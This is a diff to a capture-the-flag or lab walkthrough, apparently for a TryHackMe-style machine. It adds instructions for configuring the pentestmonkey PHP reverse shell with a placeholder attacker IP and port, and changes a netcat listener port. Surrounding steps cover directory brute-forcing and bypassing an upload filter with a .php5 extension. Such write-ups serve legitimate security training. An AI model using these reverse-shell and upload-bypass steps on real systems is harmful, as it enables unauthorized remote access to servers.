@@ -53,12 +53,21 @@ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
 
 ### 1. Prepare the Reverse Shell
 
+Use the [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
+
 ```bash
 cd /usr/share/webshells/php
 nano php-reverse-shell.php
 ```
 
-Edit the file to set your AttackBox IP and listener port (e.g., 4444).
+Edit the `$ip` and `$port` variables in the script:
+
+```php
+$ip = '<YOUR_ATTACKER_IP>';  // CHANGE THIS
+$port = 1234;                // CHANGE THIS
+```
+
+Set `$ip` to your AttackBox/tun0 IP and `$port` to the port your listener will use (default: 1234).
 
 ### 2. Bypass PHP Upload Filter
 
@@ -73,7 +82,7 @@ Upload `php-reverse-shell.php5` via the `/panel/` form.
 ### 3. Start Netcat Listener
 
 ```bash
-nc -lvnp 4444
+nc -lvnp 1234
 ```
 
 | Flag | Purpose |
